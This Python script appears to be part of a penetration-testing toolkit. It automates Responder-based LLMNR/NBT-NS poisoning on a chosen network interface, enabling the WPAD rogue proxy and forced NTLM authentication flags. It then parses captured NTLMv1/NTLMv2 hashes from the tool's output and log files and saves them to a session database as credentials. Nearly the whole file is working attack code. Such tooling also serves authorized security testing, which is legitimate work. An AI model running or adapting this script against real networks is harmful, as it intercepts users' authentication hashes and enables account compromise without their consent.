#!/usr/bin/env python3
"""
Responder - LLMNR/NBT-NS/mDNS Poisoning Attack
Automates credential interception via name resolution poisoning

WARNING: Active network attack. Use only with explicit authorization.
"""

import sys
import os
import argparse
import subprocess
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

class ResponderAttack:
    """LLMNR/NBT-NS poisoning for credential capture"""
    
    def __init__(self, interface='eth0', session_dir=None):
        self.interface = interface
        self.session_dir = session_dir
        self.responder_path = self._find_responder()
        self.captured_hashes = []
    
    def _find_responder(self):
        """Locate Responder installation"""
        possible_paths = [
            '/usr/share/responder/Responder.py',
            '/opt/Responder/Responder.py',
            './Responder/Responder.py',
            'Responder.py'
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                logger.info(f"Found Responder at: {path}")
                return path
        
        logger.warning("Responder not found. Install with:")
        logger.warning("  git clone https://github.com/lgandx/Responder.git")
        return None
    
    def run_responder(self, duration=300, analyze_mode=False):
        """
        Execute Responder attack
        
        Args:
            duration: How long to run (seconds)
            analyze_mode: If True, only analyze (no poisoning)
        """
        if not self.responder_path:
            logger.error("Responder not available")
            return False
        
        logger.info("=" * 60)
        logger.info("Starting Responder - LLMNR/NBT-NS Poisoning")
        logger.info("=" * 60)
        logger.info(f"Interface: {self.interface}")
        logger.info(f"Duration: {duration}s")
        logger.info(f"Mode: {'Analyze' if analyze_mode else 'Attack'}")
        
        # Build Responder command
        cmd = [
            'python3', self.responder_path,
            '-I', self.interface,
            '-w',  # WPAD rogue proxy
            '-r',  # Enable answers for netbios wredir suffix queries
            '-d',  # Enable answers for netbios domain suffix queries
            '-P'   # Force NTLM authentication on wpad.dat file retrieval
        ]
        
        if analyze_mode:
            cmd.append('-A')  # Analyze mode (passive)
        
        # Set output directory
        if self.session_dir:
            output_dir = os.path.join(self.session_dir, 'responder_logs')
            os.makedirs(output_dir, exist_ok=True)
            # Responder uses its own log directory
            logger.info(f"Logs will be in: {output_dir}")
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.warning("⚠️  LLMNR/NBT-NS poisoning attack starting...")
        
        try:
            # Run Responder for specified duration
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            start_time = time.time()
            
            while time.time() - start_time < duration:
                # Check if process is still running
                if process.poll() is not None:
                    break
                
                # Read output
                line = process.stdout.readline()
                if line:
                    logger.info(f"[Responder] {line.strip()}")
                    
                    # Parse for captured hashes
                    if 'NTLMv2-SSP Hash' in line or 'NTLMv1-SSP Hash' in line:
                        self._parse_hash(line)
                
                time.sleep(1)
            
            # Terminate Responder
            process.terminate()
            process.wait(timeout=5)
            
            logger.info(f"Responder completed. Captured {len(self.captured_hashes)} hashes")
            return True
            
        except subprocess.TimeoutExpired:
            process.kill()
            logger.error("Responder did not terminate gracefully")
            return False
        
        except Exception as e:
            logger.error(f"Responder execution failed: {e}")
            return False
    
    def _parse_hash(self, line):
        """Parse captured hash from Responder output"""
        # Responder format: [SMB] NTLMv2-SSP Hash     : user::domain:challenge:response
        try:
            if '::' in line:
                hash_part = line.split(':', 1)[1].strip()
                self.captured_hashes.append({
                    'hash': hash_part,
                    'timestamp': datetime.now().isoformat(),
                    'source': 'Responder'
                })
                logger.warning(f"🔑 Captured hash: {hash_part[:50]}...")
        except:
            pass
    
    def parse_responder_logs(self):
        """Parse Responder log files for captured credentials"""
        # Responder stores logs in ./logs/ by default
        log_dirs = [
            './Responder/logs',
            '/usr/share/responder/logs',
            '/opt/Responder/logs'
        ]
        
        found_hashes = []
        
        for log_dir in log_dirs:
            if not os.path.exists(log_dir):
                continue
            
            logger.info(f"Parsing logs in: {log_dir}")
            
            # Look for session log files
            for log_file in Path(log_dir).glob('*-NTLMv*.txt'):
                logger.info(f"  Reading: {log_file.name}")
                
                try:
                    with open(log_file, 'r') as f:
                        for line in f:
                            if '::' in line:
                                parts = line.strip().split('::')
                                if len(parts) >= 2:
                                    username = parts[0]
                                    hash_value = line.strip()
                                    
                                    found_hashes.append({
                                        'username': username,
                                        'hash': hash_value,
                                        'source': f'Responder:{log_file.name}',
                                        'hash_type': 'NTLMv2' if 'NTLMv2' in log_file.name else 'NTLMv1'
                                    })
                except Exception as e:
                    logger.error(f"Error reading {log_file}: {e}")
        
        logger.info(f"Found {len(found_hashes)} hashes in Responder logs")
        return found_hashes
    
    def save_to_database(self, db, hashes):
        """Save captured hashes to database"""
        for hash_data in hashes:
            db.add_credential(
                username=hash_data.get('username', 'Unknown'),
                domain='N/A',
                password=hash_data['hash'],
                source=hash_data.get('source', 'Responder'),
                is_hash=True
            )
            logger.info(f"Saved to DB: {hash_data.get('username', 'Unknown')}")


def main(session_dir, interface='eth0', duration=300, analyze=False):
    """Main Responder execution flow"""
    global logger
    
    setup_logger("responder", session_dir)
    logger = get_logger("responder")
    
    # Check for root
    if os.geteuid() != 0:
        logger.error("Responder requires root privileges")
        logger.error("Run with: sudo python3 responder.py ...")
        return
    
    logger.info("=" * 60)
    logger.info("Responder - LLMNR/NBT-NS Poisoning Attack")
    logger.info("=" * 60)
    
    # Initialize database
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    # Initialize Responder
    responder = ResponderAttack(interface=interface, session_dir=session_dir)
    
    # Run attack
    logger.info("[1/2] Running Responder attack...")
    success = responder.run_responder(duration=duration, analyze_mode=analyze)
    
    if not success:
        logger.error("Responder attack failed")
        return
    
    # Parse logs
    logger.info("[2/2] Parsing Responder logs...")
    hashes = responder.parse_responder_logs()
    
    # Save to database
    if hashes:
        responder.save_to_database(db, hashes)
        logger.info(f"✅ Captured {len(hashes)} credentials total")
    else:
        logger.info("No credentials captured")
    
    logger.info("Responder attack complete")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Responder - LLMNR/NBT-NS Poisoning for AD Credential Capture"
    )
    parser.add_argument("--session-dir", required=True, help="Session directory")
    parser.add_argument("--interface", default="eth0", help="Network interface")
    parser.add_argument("--duration", type=int, default=300, help="Run duration (seconds)")
    parser.add_argument("--analyze", action="store_true", help="Analyze mode (no poisoning)")
    
    args = parser.parse_args()
    
    main(args.session_dir, args.interface, args.duration, args.analyze)
